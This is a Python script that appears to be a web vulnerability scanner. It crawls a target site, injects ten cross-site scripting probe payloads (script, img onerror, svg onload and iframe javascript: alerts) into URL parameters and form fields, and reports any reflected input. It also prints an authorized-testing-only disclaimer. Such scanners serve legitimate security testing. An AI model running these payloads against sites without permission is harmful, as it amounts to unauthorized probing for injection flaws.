#!/usr/bin/env python3
"""
Ethical XSS Scanner - For authorized penetration testing only
Author: Security Professional
Date: 2024
"""

import requests
import argparse
import sys
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re
import time

class XSSTester:
    def __init__(self, target_url, delay=1, user_agent=None):
        self.target_url = target_url
        self.delay = delay
        self.session = requests.Session()
        self.vulnerable_urls = []
        
        # Set user agent
        headers = {'User-Agent': user_agent or 'Ethical-XSS-Scanner/1.0'}
        self.session.headers.update(headers)
        
        # Common XSS payloads (can be expanded)
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '" onmouseover="alert(\'XSS\')',
            "' onmouseover='alert(\"XSS\")",
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<script>document.domain</script>',
            '<script>prompt("XSS")</script>'
        ]

    def is_valid_url(self, url):
        """Check if URL is valid"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def get_forms(self, url):
        """Extract all forms from a webpage"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"Error getting forms from {url}: {e}")
            return []

    def form_details(self, form):
        """Extract form details"""
        details = {}
        details['action'] = form.attrs.get('action', '').lower()
        details['method'] = form.attrs.get('method', 'get').lower()
        details['inputs'] = []
        
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            if input_name:
                details['inputs'].append({'type': input_type, 'name': input_name})
        
        return details

    def test_url_params(self, url):
        """Test URL parameters for XSS"""
        parsed_url = urlparse(url)
        query_params = {}
        
        if parsed_url.query:
            from urllib.parse import parse_qs
            query_params = parse_qs(parsed_url.query)
        
        vulnerable = False
        
        for param in query_params:
            for payload in self.payloads:
                test_url = url.replace(
                    f"{param}={query_params[param][0]}", 
                    f"{param}={payload}"
                )
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    if payload in response.text:
                        print(f"[+] Potential XSS found in parameter: {param}")
                        print(f"    URL: {test_url}")
                        print(f"    Payload: {payload}")
                        vulnerable = True
                        self.vulnerable_urls.append(test_url)
                        break
                except Exception as e:
                    print(f"Error testing {test_url}: {e}")
        
        return vulnerable

    def test_form(self, form, url):
        """Test a form for XSS vulnerabilities"""
        details = self.form_details(form)
        target_url = urljoin(url, details['action'])
        data = {}
        
        vulnerable = False
        
        for input_field in details['inputs']:
            for payload in self.payloads:
                # Prepare form data
                for field in details['inputs']:
                    if field['name'] == input_field['name']:
                        data[field['name']] = payload
                    else:
                        data[field['name']] = 'test'
                
                try:
                    if details['method'] == 'post':
                        response = self.session.post(target_url, data=data, timeout=10)
                    else:
                        response = self.session.get(target_url, params=data, timeout=10)
                    
                    if payload in response.text:
                        print(f"[+] Potential XSS found in form field: {input_field['name']}")
                        print(f"    URL: {target_url}")
                        print(f"    Method: {details['method'].upper()}")
                        print(f"    Field: {input_field['name']}")
                        print(f"    Payload: {payload}")
                        vulnerable = True
                        self.vulnerable_urls.append(f"{target_url}?{input_field['name']}={payload}")
                        break
                
                except Exception as e:
                    print(f"Error testing form: {e}")
        
        return vulnerable

    def crawl_and_test(self, url, max_depth=2, current_depth=0, visited=None):
        """Crawl website and test for XSS"""
        if visited is None:
            visited = set()
        
        if current_depth > max_depth or url in visited:
            return
        
        visited.add(url)
        print(f"[*] Testing: {url}")
        
        # Test URL parameters
        self.test_url_params(url)
        
        # Test forms on the page
        forms = self.get_forms(url)
        for form in forms:
            self.test_form(form, url)
        
        # Find and follow links
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                href = link.attrs['href']
                full_url = urljoin(url, href)
                
                if self.is_valid_url(full_url) and urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                    if full_url not in visited:
                        time.sleep(self.delay)
                        self.crawl_and_test(full_url, max_depth, current_depth + 1, visited)
        
        except Exception as e:
            print(f"Error crawling {url}: {e}")

    def run_scan(self, max_depth=2):
        """Run the complete XSS scan"""
        print(f"[*] Starting XSS scan on: {self.target_url}")
        print(f"[*] Maximum crawl depth: {max_depth}")
        print("-" * 60)
        
        if not self.is_valid_url(self.target_url):
            print("[-] Invalid URL provided")
            return False
        
        try:
            # Initial test of the target URL
            self.crawl_and_test(self.target_url, max_depth)
            
            # Print summary
            print("\n" + "=" * 60)
            print("SCAN SUMMARY")
            print("=" * 60)
            
            if self.vulnerable_urls:
                print(f"[+] Found {len(self.vulnerable_urls)} potential XSS vulnerabilities:")
                for vuln_url in self.vulnerable_urls:
                    print(f"  - {vuln_url}")
            else:
                print("[-] No XSS vulnerabilities found")
            
            return len(self.vulnerable_urls) > 0
        
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")
            return False
        except Exception as e:
            print(f"[-] Error during scan: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description='Ethical XSS Scanner')
    parser.add_argument('target', help='Target URL to test')
    parser.add_argument('-d', '--depth', type=int, default=2, 
                       help='Maximum crawl depth (default: 2)')
    parser.add_argument('--delay', type=float, default=1,
                       help='Delay between requests in seconds (default: 1)')
    parser.add_argument('-o', '--output', help='Output file for results')
    
    args = parser.parse_args()
    
    # Disclaimer
    print("=" * 70)
    print("ETHICAL XSS SCANNER - FOR AUTHORIZED TESTING ONLY")
    print("=" * 70)
    print("This tool should only be used on systems you own or have")
    print("explicit permission to test. Unauthorized use is illegal.")
    print("=" * 70)
    
    # Run the scanner
    scanner = XSSTester(args.target, args.delay)
    vulnerabilities_found = scanner.run_scan(args.depth)
    
    # Save results if output specified
    if args.output and scanner.vulnerable_urls:
        with open(args.output, 'w') as f:
            f.write(f"XSS Scan Results for {args.target}\n")
            f.write("=" * 50 + "\n")
            for vuln in scanner.vulnerable_urls:
                f.write(f"{vuln}\n")
        print(f"\n[+] Results saved to {args.output}")
    
    return 0 if vulnerabilities_found else 1

if __name__ == "__main__":
    sys.exit(main())